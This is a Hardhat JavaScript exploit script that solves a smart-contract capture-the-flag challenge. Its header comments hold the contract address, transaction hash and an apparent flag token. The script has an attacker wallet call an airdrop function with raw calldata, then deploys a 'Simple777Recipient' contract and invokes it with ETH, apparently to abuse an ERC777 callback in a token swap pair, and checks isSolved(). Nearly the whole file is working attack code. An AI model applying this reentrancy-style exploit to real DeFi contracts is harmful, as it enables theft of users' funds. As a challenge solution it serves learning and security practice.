// [+] contract address: 0x73b26ED9095B81065cBB9eC9b57c7eDd854b0F91
// [+] transaction hash: 0xd9dae11ce4ac82281a1ac4ff28376cfd14236cd9716bfe1edcdd99d2269341dc
// v4.local.cytM0bZVbaYgs80zR73wTW7Bhy27-NIg8M9jrvi0hq2NGEZkTHCYZiq2C5CLQk3aMba9s1qfOnQJM6Da647IvB9kJQzbn94govhzFYshhrLK8VOpaWieMs9Miq8-WcqE9EVNE71V6AxBIoweFMAJKguXgCX-7qhPb2j2IGwChnK8dg.Q2hhbGxlbmdl

const { ethers } = require("hardhat");
const { expect } = require("chai");

const erc20ABI = require("./../abi/erc20.json");
const swapABI = require("./../abi/swap.json");
const pairABI = require("./../abi/pair_logic.json");
async function main(){
    let provider = ethers.provider;
    let attacker = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    const swap_addr = "0xB56121D9c4968206E8990aaf897beebde0339305";
    // console.log(await provider.getStorage(swap_addr,0));
    // console.log(await provider.getStorage(swap_addr,1));
    // console.log(await provider.getStorage(swap_addr,2));
    // console.log(await provider.getStorage(swap_addr,3));
    const token0_addr     = "0xfd27017106933d86bb35b9d4a26403335750dbbd";
    const token1_addr     = "0x65d8a7f9503fac808fcad94c7e28a3a75e14e080";
    const fac_addr        = "0xadce9f173330f42973f996bce8e58df6f5d46563";
    const pair_addr       = "0x39aeba2fc6983cf4ccd0775de02eedda43c75243";

    // console.log(await provider.getCode(token0_addr));
    // const pair_logic_addr = "0x1051834f41c6ed5bfe6405af0fafc214cf32b4ac"

    const swap = new ethers.Contract(
        swap_addr,
        swapABI,
        provider
    );

    const token1 = new ethers.Contract(
        token1_addr,
        erc20ABI,
        provider
    );

    const pair = new ethers.Contract(
        pair_addr,
        pairABI,
        provider
    );

    // let's call airdrop in token1
    console.log(await token1.balanceOf(attacker.address));
    await attacker.sendTransaction({
        to: swap_addr,
        data: "0x7b174d54"
    });

    // console.log(await token1.balanceOf(attacker.address));//18000000000000000000
    // console.log(await provider.getBalance(attacker.address));
    // console.log(await token1.balanceOf(pair_addr));//18000000000000000000
    // console.log(await provider.getBalance(pair_addr));//1000000000000000000

    const rece777Fac = await ethers.getContractFactory("Simple777Recipient");
    const rece777 = await rece777Fac.connect(attacker).deploy();

    await rece777.invoke("9000000000000000000",{value:"2000000000000000000"});
    console.log(await swap.isSolved());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
    